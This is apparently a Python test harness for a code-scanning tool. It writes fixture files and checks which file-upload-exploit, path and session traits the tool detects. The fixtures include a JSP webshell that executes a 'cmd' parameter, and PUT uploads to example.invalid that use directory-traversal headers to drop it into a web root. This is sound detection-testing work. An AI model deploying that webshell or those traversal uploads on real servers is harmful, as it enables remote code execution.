"""Check upload provenance and false-positive boundaries without executing fixtures."""
import json
from pathlib import Path
import subprocess
import sys

root = Path(__file__).resolve().parents[3]
destination = Path(sys.argv[1]).resolve()
destination.mkdir(parents=True, exist_ok=True)
exploit = 'objectives/execution/exploit/file-upload::'
paths = 'micro-behaviors/fs/path/app-data::'
sessions = 'micro-behaviors/os/security/auth/session::'
body_trait = 'micro-behaviors/communications/http/put::python-put-runtime-exec-body'
response = 'micro-behaviors/communications/http/response::jsp-response-print-syntax'
body = '<% String cmd = request.getParameter("cmd"); if(cmd != null) { Runtime.getRuntime().exec(cmd); } %>'
preamble = 'import requests\nbody = ' + repr(body) + '\n'
admin = 'admin = {"LoginName":"operator", "Password":"example", "Role":"admin"}\n'
traversal = 'headers = {"X-Upload-Directory": "../../webapps/portal"}\n'
safe_headers = 'headers = {"Content-Type":"application/octet-stream"}\n'
put = 'requests.put("https://example.invalid/upload", data=body, headers=headers)\n'
urllib_source = '''import urllib.request
with open("/tmp/page.jsp", "rb") as source:
    payload = source.read()
upload = urllib.request.Request("https://example.invalid/upload", data=payload,
    headers={"X-Home":"../../webapps/portal"}, method="PUT")
urllib.request.urlopen(upload)
'''
hostiles = [exploit + 'webroot-traversal-upload-drop', exploit + 'admin-fields-with-webroot-command-upload']
windows = [paths + 'windows-appdata-path-marker', paths + 'windows-appdata-directory-path']
session_ids = [sessions + 'source-session-user-member-assignment', sessions + 'source-session-user-assignment', sessions + 'source-privileged-session-setup']
cases = {
 'upload.py': (preamble + admin + traversal + put, hostiles + [body_trait, exploit + 'python-jvm-code-traversal-put'], []),
 'benign-upload.py': (admin + traversal + safe_headers + 'import requests\nrequests.put("https://example.invalid/upload", data="ordinary backup", headers=headers)\n', [], hostiles + [body_trait, exploit + 'python-jvm-code-traversal-put']),
 'unused-webshell.py': (preamble + admin + traversal + put.replace('data=body', 'data="backup data"'), [], hostiles + [body_trait, exploit + 'python-jvm-code-traversal-put']),
 'unused-traversal.py': (preamble + admin + 'unused = "../../webapps/portal"\n' + safe_headers + put, [body_trait], hostiles + [exploit + 'python-jvm-code-traversal-put']),
 'separate-puts.py': (preamble + admin + safe_headers + put + traversal + put.replace('data=body', 'data="backup data"'), [body_trait], hostiles + [exploit + 'python-jvm-code-traversal-put']),
 'windows-paths.py': ('profile = r"C:\\Users\\analyst\\AppData\\Roaming\\Widget"\n', windows, []),
 'escaped-windows-paths.py': (r'profile = "C:\\Users\\analyst\\AppData\\Local\\Widget"' + '\n', windows, []),
 'linux-paths.py': ('root = "/opt/appdata/receiver"\n# Create an admin without holding a session.\nadmin = {}\n', [], windows + session_ids),
 'session-assignment.py': ('session.user = principal\n', session_ids[:1], []),
 'response.jsp': ('<%@ page import="java.io.*" %>\n<% int octet=65; out.print((char) octet); %>\n', [response], []),
 'response-comment.jsp': ('<%@ page import="java.io.*" %>\n<%-- out.print((char) octet); --%>\n', [], [response]),
 'curl-upload.sh': ('#!/bin/sh\ncurl -X PUT --data @/tmp/page.php -H "X-Home: ../../htdocs/portal" https://example.invalid/upload\n', hostiles[:1], []),
 'curl-binary.sh': ('#!/bin/sh\ncurl -X PUT --data @/tmp/backup.bin -H "X-Home: ../../htdocs/portal" https://example.invalid/upload\n', [], hostiles),
 'curl-unrelated-traversal.sh': ('#!/bin/sh\ncurl -X PUT --data @/tmp/page.php https://example.invalid/upload\necho "../../htdocs/portal"\n', [], hostiles),
 'urllib-upload.py': (urllib_source, hostiles[:1], []),
 'urllib-data-file.py': (urllib_source.replace('page.jsp', 'backup.json'), [], hostiles),
 'urllib-unused-read.py': (urllib_source.replace('data=payload', 'data=b"backup"'), [], hostiles),
 'urllib-unsent.py': (urllib_source.replace('urllib.request.urlopen(upload)', 'print(upload)'), [], hostiles),
}
for name, (source, _, _) in cases.items():
    (destination / name).write_text(source)
result = subprocess.run(['cleave', '--traits-dir', str(root), '--format', 'json', str(destination)], text=True, capture_output=True)
if result.returncode:
    raise SystemExit(result.stdout + result.stderr)
reports = []
remaining = result.stdout.strip()
while remaining:
    report, end = json.JSONDecoder().raw_decode(remaining)
    reports.append(report)
    remaining = remaining[end:].lstrip()
files = {Path(f['path']).name: {t['id'] for t in f['traits']}
         for report in reports for f in report['files']}
failed = False
for name, (_, present, absent) in cases.items():
    observed = files.get(name, set())
    errors = ['missing ' + i for i in present if i not in observed]
    errors += ['unexpected ' + i for i in absent if i in observed]
    print(('FAIL ' if errors else 'PASS ') + name)
    for error in errors:
        print('  ' + error)
    failed |= bool(errors)
raise SystemExit(int(failed))
